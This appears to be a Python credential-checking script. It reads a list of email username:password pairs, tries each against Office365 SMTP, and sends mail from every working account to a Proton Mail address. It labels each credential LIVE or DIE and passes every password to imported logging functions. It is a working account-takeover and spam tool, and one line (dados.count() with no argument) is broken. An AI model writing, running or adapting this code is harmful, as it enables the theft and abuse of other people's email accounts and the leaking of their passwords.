import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from comandos import enviarlogSMTPlive,enviarlogAPISMTPdie,enviarlogAPISMTPinicio
def enviar_email(usuario, senha, assunto, mensagem):
    smtp_host = 'smtp.office365.com'
    smtp_port = 587
    try:
        servidor_smtp = smtplib.SMTP(smtp_host, smtp_port)
        servidor_smtp.starttls()
        servidor_smtp.login(usuario, senha)
        msg = MIMEMultipart()
        msg['From'] = usuario
        msg['To'] = 'flashcashcompany@proton.me'
        msg['Subject'] = assunto
        corpo = mensagem
        msg.attach(MIMEText(corpo, 'plain'))
    
        servidor_smtp.send_message(msg)
        servidor_smtp.quit()
        enviarlogSMTPlive(usuario,senha)
        return f"LIVE => {usuario}:{senha} - (EMAIL ENVIADO)"
    except Exception as e:
        enviarlogAPISMTPdie(usuario,senha)
        return f"DIE => {usuario}:{senha} - (ERRO) {e}"
def enviar_emails_arquivo(arquivo, assunto, mensagem,user):
    with open(arquivo, 'r') as f:
        dados = f.readlines()
        enviarlogAPISMTPinicio(user,dados.count()) 
    for linha in dados:
        usuario, senha = linha.strip().split(':')
        enviado_com_sucesso = enviar_email(usuario, senha, assunto, mensagem)
        print(enviado_com_sucesso)    
    return "ok"



